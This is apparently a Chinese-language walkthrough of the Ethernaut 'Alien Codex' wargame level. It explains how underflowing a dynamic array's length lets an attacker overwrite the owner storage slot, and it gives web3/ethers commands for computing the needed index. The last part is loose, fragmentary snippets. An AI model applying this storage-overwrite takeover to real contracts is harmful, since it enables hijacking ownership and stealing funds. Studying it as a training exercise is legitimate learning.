You've uncovered an Alien contract. Claim ownership to complete the level.

 Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```







参考链接1https://cyanwingsbird.blog/solidity/ethernaut/19-alien-codex/

参考链接2https://ethereum.stackexchange.com/a/113907





这个puzzle还是考察合约的slot分布的，可以稍微参考Hack Solidity中的4.Accessing Private Data

```solidity
abstract contract Ownable is Context {
    address private _owner;
}
```

因为继承了[Ownable](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol)，所以AlienCodex中 slot 0 就是 _owner，因为address是20个字节，不足32个字节，所以contact也存在 slot 0 上

```javascript
await web3.eth.getStorageAt(instance, 0 )
// 0x0000000000000000000000003c34a342b2af5e885fcaa3800db5b205fefa3ffb
```

先使用api查看一下 slot 0，可以看到3c前边的一个字节是00，当我们调用 **contract.make_contact()** 使contac这个布尔值变为true之后，再用api查看 slot 0

```js
await web3.eth.getStorageAt(instance, 0 )
// 0x0000000000000000000000013c34a342b2af5e885fcaa3800db5b205fefa3ffb
```

可以看到3c前边那个字节已经变成01了，所以从侧面就证明了contact和_owner都存于 slot 0 上

```js
await web3.eth.getStorageAt(instance, 1 )
// 0x0000000000000000000000000000000000000000000000000000000000000000
```

再用api查看 slot 1，根据官方文档的[Mappings and Dynamic Arrays](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays)，动态数组的长度即本puzzle中的codex数组的长度存在 slot 1 上，其中每个item存在 **slot ( keccak256(1) + i )**上，此时，可以看到，因为是空数组长度为0，所以返回值也为0

调用 **contract.retract()** 使数组长度发生underflow

```js
await web3.eth.getStorageAt(instance, 1 )
// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

使用api看到数组的长度发生了underflow，此时的值为2^256 - 1

```erlang
p = keccak256(slot)
or, p = keccak256(1)


Slot        Data
------------------------------
0             owner address, contact bool
1             codex.length
    .
    .
    .
p             codex[0]
p + 1         codex[1]
    .
    .
2^256 - 2     codex[2^256 - 2 - p]
2^256 - 1     codex[2^256 - 1 - p]
0             codex[2^256 - p]  (overflow!)
```

根据**SLOAD**的定义：`key`: 32-byte key in storage，可以知道一个contract中有2^256个slot，序号为 0 - 2^256 - 1

当slot的index值达到2^256的时候会发生overflow，即wrap around回0，codex数组位于slot p，其中p的值为keccak256(1)，将slot 0看作是codex的第**i**个元素，那么给codex[i]赋值就相当于给_owner赋值，所以我们此时只需要找出来能够发生overflow时**i**的值就可以了，公式如下：

keccak256(1) + i = 2^256

这里第一个需要注意的地方：solidity中使用的keccak256中所要传递的参数需要pack，所以和普通的keccak256有一些不一样，web3js中有两个api，一个[sha3](https://web3js.readthedocs.io/en/v1.8.0/web3-utils.html#sha3)，一个[soliditySha3](https://web3js.readthedocs.io/en/v1.8.0/web3-utils.html#soliditysha3)，ethers中有两个api，一个[keccak256](https://docs.ethers.io/v5/single-page/#/v5/api/utils/hashing/-%23-utils-keccak256)，一个[solidityKeccak256](https://docs.ethers.io/v5/single-page/#/v5/api/utils/hashing/-%23-utils-solidityKeccak256)，注意它们的区别，在js中使用solidity版本的

```js
// ×
web3.utils.keccak256("1")
// √
web3.utils.soliditySha3({type: 'uint', value: '1'})
web3.utils.soliditySha3(1)  // 简化写法
// √
ethers.utils.solidityKeccak256([ "uint" ], [1])
```

第二个需要注意的地方：在js中，因为都是32个字节的数字，非常大，所以需要用BigInt包裹，所以在JavaScript中的计算方法如下

```js
BigInt(2**256) - BigInt(web3.utils.soliditySha3(1))
```

此时我们已经确定了i的值，



  







hexdecimal increasing:   (BigInt(hash) + 1n).toString(16)





web3.eth.getStorageAt("", web3.utils.soliditySha3({type: 'uint', value: '1'}) )



web3.utils.toAscii("0x6162630000000000000000000000000000000000000000000000000000000000")



BigInt(2**256) - BigInt(hash)



ethers.utils.hexZeroPad(player, 32)

web3.utils.padLeft(player, 64);
